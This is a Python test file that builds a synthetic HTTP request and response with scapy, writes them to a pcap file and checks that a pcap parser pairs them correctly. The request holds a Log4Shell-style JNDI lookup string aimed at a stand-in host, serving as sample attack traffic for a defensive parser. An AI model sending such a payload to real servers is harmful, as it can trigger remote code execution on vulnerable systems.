from __future__ import annotations

import sys
import tempfile
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.parser.pcap_parser import parse_pcap_events


def main() -> None:
    try:
        from scapy.all import IP, TCP, Raw, wrpcap
    except Exception:
        print("scapy not installed; skipping response pairing test")
        return

    request = (
        IP(src="10.0.0.5", dst="10.0.0.10")
        / TCP(sport=44444, dport=80)
        / Raw(load=b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\nHost: victim\r\nUser-Agent: demo\r\n\r\n")
    )
    response = (
        IP(src="10.0.0.10", dst="10.0.0.5")
        / TCP(sport=80, dport=44444)
        / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
    )

    with tempfile.TemporaryDirectory() as temp_dir:
        pcap = Path(temp_dir) / "pair.pcap"
        wrpcap(str(pcap), [request, response])
        events = parse_pcap_events(str(pcap))
        assert len(events) == 1
        assert events[0].method == "GET"
        assert events[0].status_code == 200
        assert events[0].response_size is not None
        assert events[0].response_summary.startswith("HTTP/1.1 200 OK")


if __name__ == "__main__":
    main()

